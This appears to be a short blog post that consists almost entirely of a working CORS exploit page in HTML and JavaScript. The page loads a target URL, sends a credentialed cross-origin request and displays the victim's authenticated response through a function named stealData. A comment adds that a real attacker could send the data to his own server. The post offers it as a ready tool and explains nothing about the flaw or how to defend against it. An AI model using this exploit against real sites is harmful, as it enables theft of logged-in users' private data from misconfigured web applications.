+++
title = "CORS-Exploit"
date = "2019-03-10"
author = "m4xx"
description = "PWn.!PWn.!PWn.!"
+++


<!DOCTYPE html>
<html>
<head>
<title>CORS</title>
<script>
var turl;
function new_target(){
  turl = document.getElementById('target').value;
  
  document.getElementById('lable1').innerHTML = 'Target Loaded Successfully';
	
}
 
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("pwnz").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", window.turl , true);
  xhttp.onload = stealData;
  xhttp.withCredentials = true;
  xhttp.send();

}
function stealData(){
        //read the response, and extract the data
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //display it on the page. A real attacker can send the data to his server.
        output(data);
    }
 function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
</script>
</head>
<body>
<center>
<h2>CORs Exploit</h2>
<textarea id="target">
</textarea>
<br>
<button type="button" onclick="new_target()">Load New Target</button>
</div>
<br>
<lable id="lable1">Target Not Loaded Yet.!</lable>
<br>
<br>
<br>
<textarea rows="10" cols="60" id="pwnz">
</textarea><br>
<button type="button" onclick="cors()">Exploit</button>
</div>

